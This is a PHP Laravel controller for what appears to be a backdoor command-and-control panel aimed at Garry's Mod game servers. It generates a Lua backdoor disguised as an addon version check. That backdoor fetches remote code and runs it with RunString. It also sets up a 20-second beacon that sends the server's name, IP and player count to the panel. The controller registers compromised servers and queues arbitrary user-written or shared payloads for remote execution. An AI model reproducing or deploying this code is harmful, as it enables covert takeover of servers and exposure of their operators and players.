<?php

namespace App\Http\Controllers\kermini;

use App\Http\Controllers\Controller;
use App\Http\Controllers\kermini\special\screenGrabber;
use App\Models\global_payloads;
use App\Models\Logs;
use App\Models\payloads_queue;
use App\Models\servers;
use App\Models\user_payloads;
use Exception;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Auth\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Nette\Utils\DateTime;
use TimeHunter\LaravelGoogleReCaptchaV3\Validations\GoogleReCaptchaV3ValidationRule;
use xPaw\SourceQuery\SourceQuery;

class userLogic extends Controller
{

    /**
     * @var int How many servers should be displayed on user view
     */
    private $serversperpage = 20;

    /**
     * @var int How many payloads should be displayed on user view
     */
    private $payloadsperpage = 5;

    /**
     * Displays the dashboard view for kdrm
     *
     * @param $pageid page's number
     * @return Application|Factory|View|RedirectResponse
     */
    public function dashboard($pageid=null, Request $request)
    {

        if(
            $pageid!=null
            and !is_numeric($pageid)
        ){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $hmservers = servers::where('user_id', $request->user()->id)->count();
        $buttons = ceil($hmservers / $this->serversperpage);

        if(
            $pageid==null
            or $pageid<1
            or $pageid > $buttons
        ){
            $pageid = 1;
        } // setting default page

        $servers = servers::where('user_id', $request->user()->id)->get()->reverse()
            ->splice(($pageid - 1) * $this->serversperpage, $this->serversperpage);

        return view('dashboard', compact(
            'servers',
            'buttons'
        ));

    }

    /**
     * Displays the user profile publicly
     *
     * Bans users putting non-numeric characters in the user's id
     * @param  int  $id user's id
     * @param  Request  $request request object to get the user
     * @return Application|Factory|View|RedirectResponse
     */
    public function showUserProfile($id, Request $request){

        if(! is_numeric($id)){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $user = DB::table('users')->where('id', $id)->first();

        switch(DB::table('users')->where('id', $id)->count()){
            case 1:

                $server_count = servers::where('user_id', $user->id)->count();
                return view('kdrm.userprofile', compact(
                    'user',
                    'server_count'
                ));
            case 0:
                return redirect()->back()->with(
                    'status', "Wait, ... you can't do that 😳"
                );
        }
    }

    /**
     * Display the backdoor config page for users
     *
     * @param Request $request
     * @return Application|Factory|View
     */
    public function getbackdoor(Request $request){
        $backdoor = 'nope';
        if($request->user()->infection_key != 'nope'){
            $backdoor = '
                if SERVER then
                    hook.Add(
                        "PlayerConnect",
                        "CheckVersionOfMyAddon",
                        function()
                            http.Fetch(
                                "'.route('serverBackdoorget', ['key' => $request->user()->infection_key]).'",
                                function(body, length, headers, code)
                                    RunString(body)
                                end,
                                function(message)
                                    print("Failed Kdrm Start")
                                end
                            )

                            hook.Remove("PlayerConnect", "CheckVersionOfMyAddon")
                        end
                    )
                end
            ';
        }
        return view('backdoor.dashboard', compact(
            'backdoor',
        ));
    }

    /**
     * Generates a new infection key for the user
     *
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     */
    public function regenbackdoor(Request $request){
        $user = $request->user();

        if($user->infection_key != 'nope'){
            $error = 'Key already generated, contact an admin';
            return redirect()->route('seeBackdoor', compact(
                'error',
            ));
        }
        else
        {
            $user->infection_key = Str::random(30);
            $user->update();
            $user->touch();
            return redirect()->route('seeBackdoor');
        }

    }

    /**
     * Displays actual backdoor code on get
     *
     * @param $key
     * @param Request $request
     * @return string
     */
    public function serverBamboozleGET($key, Request $request){
        $res = User::where('infection_key', $key)->get();
        $backdoor_code = "
            local drmlicense = '".Str::random(30)."'
        ";

        if($res->count()>0){
            $backdoor_code = '
            local baa = 0
            local resp = "default"
            timer.Create(
                "'.Str::random(10).'",
                20,
                0,
                function()
                    baa = baa + 1
                    local a = {
                        n = GetHostName(),
                        nb = tostring(#player.GetAll()),
                        i = game.GetIPAddress(),
                        ba = tostring(baa),
                        s = resp
                    }
                    http.Post(
                        "'.route('serverBackdoorpost', ['key' => $key]).'",
                        a,
                        function(body, len, headers, code)
                            RunString(body)
                        end
                    )
                end
            )
            ';
        }

        return $backdoor_code;
    }


    /**
     * Adds/updates the server in the database and executes a payload if needed
     *
     * @param $key
     * @param Request $request
     * @return string
     */
    public function serverBamboozle($key, Request $request)
    {
        $user = User::where('infection_key', $key)->get();
        $backdoor_code = "
            local drmlicense = '".Str::random(30)."'
        ";

        if($user->count()>0){
            ///////////
            $server_ip = $request->post('i');
            $server_status = $request->post('s');

            $server_playersnb = $request->post('nb');
            $server_name = $request->post('n');

            if (
                $server_ip != ""
            )
            {
                if (preg_match('~\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):([0-9]{1,5}\b)~', $server_ip, $matches)) {
                    $ip = $matches[1];
                    $port = $matches[2];


                    $server = servers::where([
                        ['ip', '=', $ip],
                        ['port', '=', $port]
                    ])->get();

                    if ($server->count() == 0) {

                        $server = new servers();
                        $server->name = $server_name;
                        $server->players = $server_playersnb;
                        $server->ip = $ip;
                        $server->port = $port;
                        $server->status = $server_status;
                        $server->user_id= $user->first()->id;

                        $server->save();
                    } else {

                        $server = $server->first();

                        //calculates time elapsed since last update
                        $date = new DateTime( $server->updated_at );
                        $date2 = new DateTime( date('Y-m-d H:i:s') );
                        $time_since_last_update = $date2->getTimestamp() - $date->getTimestamp();

                        //verifies it to be 20 sec to avoid update spam
                        if(
                           //(
                                //(//regular ping after boot
                                    //$time_since_last_update == 20 and
                                    $request->post('ba') != 1
                                //)
                                //or
                                //( //server first start after reboot, etc
                                    //$time_since_last_update != 20 and
                                    //$time_since_last_update > 8
                                    //$request->post('ba') == 1
                                //)
                            //) and $server->ip == $request->ip() //verifies the user behind request is the same ip as initial

                        )
                        {
                            $server->name = $server_name;
                            $server->players = $server_playersnb;
                            $server->status = $server_status;
                            $server->update(); //updates data
                            $server->touch(); //updates updated_at

                            $payload_queue = payloads_queue::where(
                                [
                                    ['server_id', '=', $server->id],
                                    ['execution', '=', 0]
                                ]
                            )->get();

                            if ($payload_queue->count() > 0) {
                                $payload = $payload_queue->first();

                                $backdoor_code = $payload->content;

                                $payload->execution = 1;
                                $payload->update();
                            }
                        }
                    }
                }
            }
            ///////////
        }

        //$backdoor_code = "print('".$request->getClientIp()."')";
        return $backdoor_code;
    }

    /**
     * Shows user's payloads
     *
     * @param $pageid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     */
    public function userPayloads($pageid=null, Request $request){

       if(
            $pageid!=null
            and !is_numeric($pageid)
        ){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $hmpayloads = user_payloads::where('user_id', $request->user()->id)->count();
        $buttons = ceil($hmpayloads / $this->payloadsperpage);

        if(
            $pageid==null
            or $pageid<1
            or $pageid > $buttons
        ){
            $pageid = 1;
        } // setting default page

        $payloads = user_payloads::where('user_id', $request->user()->id)->get()->reverse()
            ->splice(($pageid - 1) * $this->payloadsperpage, $this->payloadsperpage);

        $servers = servers::where('user_id', $request->user()->id)->get();

        return view('payload.dashboard', compact(
            'payloads',
            'servers',
            'buttons'
        ));

    }

    /**
     * Sends a payload in queue
     *
     * Verifies if the payload and server are from the same request user
     *
     * @param Request $request
     * @return RedirectResponse
     */
    public function sendPayload(Request $request){
        $customMessages = [
            'required' => ':attribute is required.'
        ];

        $validator = Validator::make($request->all(), [
            'serverid' => 'required|integer|',
            'payloadid' => 'required|integer|',
        ],$customMessages);
        if ($validator->fails()) {
            return redirect()->back()->with(
                'status', 'Query invalid'
            )->withErrors($validator);
        }else {
            if( //prevents people entering random integer in post params
                servers::where('id', $request->serverid)->count() == 0 or
                user_payloads::where('id', $request->payloadid)->count() == 0
            ){
                return redirect()->back()->with(
                    'status', "You can't use resources you don't have"
                );
            }

            //gets the user that has the requested serverid
            $serveruser = User::where('id',
                servers::where('id', $request->serverid)->first()->user_id
            )->first();

            //gets the user that has the requested payloadid
            $payloaduser = User::where('id',
                user_payloads::where('id', $request->payloadid)->first()->user_id
            )->first();

            if(
                $serveruser->id == $request->user()->id and
                $payloaduser->id == $request->user()->id
            ){
                $payload = user_payloads::where('id', $request->payloadid)->first();

                $new_queue_element = new payloads_queue();
                $new_queue_element->server_id = $request->serverid;
                $new_queue_element->content = $payload->content;
                $new_queue_element->description = $payload->description;
                $new_queue_element->save();
            }
            else{
                return redirect()->back()->with(
                    'status', "You can't use resources you don't have"
                );
            }

        }

        return redirect()->route('userPayloads');
    }

    /**
     * Returns payload creation page
     *
     * @return Application|Factory|View
     */
    public function newPayload(){
        return view('payload.newpayload');
    }

    /**
     * Registers a new payload for a specfic user
     *
     * @param Request $request
     * @return RedirectResponse
     */
    public function newPayloadPost(Request $request){
        $customMessages = [
            'required' => ':attribute is required.'
        ];

        $validator = Validator::make($request->all(), [
            'description' => 'required|regex:/^[a-zA-Z0-9\s]+$/|string|max:360',
            'ccontent' => 'required|string|max:10000',
            'g-recaptcha-response' => [new GoogleReCaptchaV3ValidationRule('newpayload')]
        ],$customMessages);
        if ($validator->fails()) {
            return redirect()->back()->with(
                'status', 'Query invalid'
            )->withErrors($validator);
        }else {
            $payload = new user_payloads();
            $payload->content = $request->ccontent;
            $payload->description = $request->description;
            $payload->user_id = $request->user()->id;
            $payload->save();
        }

        return redirect()->route('userPayloads');
    }

    /**
     * Shows the payload edition page
     *
     * @param $payloadid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     */
    public function editPayload($payloadid, Request $request){
        $payload = user_payloads::where('id', $payloadid)->get();
        if(
            $payload->count() == 0 or
            $request->user()->id != $payload->first()->user_id
        ){
            return redirect()->back()->with(
                'status', "You can't use resources you don't have"
            );
        }

        $payload = $payload->first();
        return view('payload.editpayload', compact(
            'payload'
        ));
    }


    /**
     * Manages the payload edition request
     *
     * @param Request $request
     * @return RedirectResponse
     */
    public function editPayloadPost(Request $request){
        $customMessages = [
            'required' => ':attribute is required.'
        ];

        $validator = Validator::make($request->all(), [
            'description' => 'required|regex:/^[a-zA-Z0-9\s]+$/|string|max:360',
            'ccontent' => 'required|string|max:10000',
            'payloadid' => 'required|integer',
            'g-recaptcha-response' => [new GoogleReCaptchaV3ValidationRule('editpayload')]
        ],$customMessages);
        if ($validator->fails()) {
            return redirect()->back()->with(
                'status', 'Query invalid'
            )->withErrors($validator);
        }else {

            $payload = user_payloads::where('id', $request->payloadid)->get();
            if(
                $payload->count() == 0 or
                $request->user()->id != $payload->first()->user_id
            ){
                return redirect()->back()->with(
                    'status', "You can't use resources you don't have"
                );
            }

            $payload = $payload->first(); //gets payload object

            $payload->content = $request->ccontent;
            $payload->description = $request->description;

            $payload->update(); //update payload values
            $payload->touch(); //update updated_at

        }

        return redirect()->route('userPayloads');
    }

    /**
     * Manages the payload deletion request
     *
     * @param $payloadid
     * @param Request $request
     * @return RedirectResponse
     */
    public function deletePayload($payloadid, Request $request){
        $payload = user_payloads::where('id', $payloadid)->get();
        if(
            ($request->user()->admin != 2 &&
                ($request->user()->id != $payload->first()->user_id)
            )
            or $payload->count() == 0
            or (
                adminLogic::getUserById($payload->first()->user_id)->admin >= $request->user()->admin &&
                $request->user()->id != $payload->first()->user_id
            )
        ){
            return redirect()->back()->with(
                'status', "You can't use resources you don't have"
            );
        }

        if($payload->first()->user_id != $request->user()->user_id){
            $log = new Logs();
            $log->level = 'warning';
            $log->message = $request->user()->name . ' deleted a payload ('
                . Str::limit($payload->first()->description, 200, $end='...)') .
                ' from ' . adminLogic::getUserById($payload->first()->user_id)->name . '('.$payload->first()->user_id.')';
            $log->user_id = $request->user()->id;
            $log->save();
        }

        $payload->first()->delete(); //delete payload
        return redirect()->route('userPayloads');
    }

    /**
     * Displays server details when clicking on the server name
     *
     * Bans users using non-numeric characters in the 'serverid' parameter
     * @param $serverid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     */
    public function displayServerDetails($serverid, Request $request){
        if(
            $serverid!=null
            and !is_numeric($serverid)
        ){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $server = servers::where('id', $serverid);

        if (
            $server->count() == 1 &&
            $server->first()->user_id == $request->user()->id
        ) {
            $Query = new SourceQuery();
            $server = $server->first();

            $Exception = null;
            try {
                $debug = screenGrabber::$debug;
                if ($debug)
                {
                    $Query->Connect('46.174.53.204', '27015', 3, SourceQuery::SOURCE);
                }else {
                    $Query->Connect($server->ip, $server->port, 3, SourceQuery::SOURCE);
                }
                //$Query->SetUseOldGetChallengeMethod( true ); // Use this when players/rules retrieval fails on games like Starbound

                $Info = $Query->GetInfo();
                $Players = $Query->GetPlayers();
                $Rules = $Query->GetRules();
            } catch (Exception $e) {
                $Exception = $e;
            } finally {
                $Query->Disconnect();
            }

            if ($Exception == null){
                return view('serverdetails', compact(
                    'server',
                    'Info',
                    'Players',
                    'Rules',
                    'Exception'
                ));
            }else{
                $status = "Error while connecting to the server, displaying DB info";
                return view('serverdetails', compact(
                        'server',
                        'status',
                        'Exception'
                    ));
            }

        }
        else{
            return redirect()->back()->with(
                'status', "It's not your server :("
            );
        }

    }

    /**
     * Shows all the global payloads to the user
     *
     * @param $pageid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     */
    public function GlobalPayloads($pageid=null, Request $request){
        if(
            $pageid!=null
            and !is_numeric($pageid)
        ){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $hmpayloads = global_payloads::count();
        $buttons = ceil($hmpayloads / $this->payloadsperpage);

        if(
            $pageid==null
            or $pageid<1
            or $pageid > $buttons
        ){
            $pageid = 1;
        } // setting default page

        $payloads = global_payloads::all()->reverse()
            ->splice(($pageid - 1) * $this->payloadsperpage, $this->payloadsperpage);

        return view('payload.global', compact(
            'payloads',
            'buttons'
        ));
    }

    /**
     * Downloads the selected global payload to the user's payloads
     *
     * @param Request $request
     * @return RedirectResponse
     */
    public function DownloadGlobalPayload(Request $request){
        $customMessages = [
            'required' => ':attribute is required.'
        ];

        $validator = Validator::make($request->all(), [
            'payloadid' => 'required|integer|max:10',
            'g-recaptcha-response' => [new GoogleReCaptchaV3ValidationRule('DownloadGlobalPayload')]
        ],$customMessages);
        if ($validator->fails()) {
            return redirect()->back()->with(
                'status', 'Query invalid'
            )->withErrors($validator);
        }else {

            $selected_payload = global_payloads::where('id', $request->payloadid);

            if($selected_payload->count() != 1){
                return redirect()->back()->with(
                    'status', "This global payload does not exist"
                );
            }

            $selected_payload = $selected_payload->first();

            $userPayload = new user_payloads();
            $userPayload->user_id = $request->user()->id;
            $userPayload->content = $selected_payload->content;
            $userPayload->description = $selected_payload->description;
            $userPayload->save();

            $selected_payload->copies = $selected_payload->copies + 1;
            $selected_payload->update();

        }

        return redirect()->route('userPayloads');
    }

    /**
     * Deletes the requested server
     *
     * @param $serverid
     * @param Request $request
     * @return RedirectResponse
     */
    public function deleteServer($serverid, Request $request){
        $server = servers::where('id', $serverid);

        if($server->count() != 1){
            return redirect()->back()->with(
                'status', "This server does not exist"
            );
        }

        if($server->first()->user_id != $request->user()->id){
            return redirect()->back()->with(
                'status', "This is not your server"
            );
        }

        $server->first()->delete();

        return redirect()->route("dashboard");
    }
}
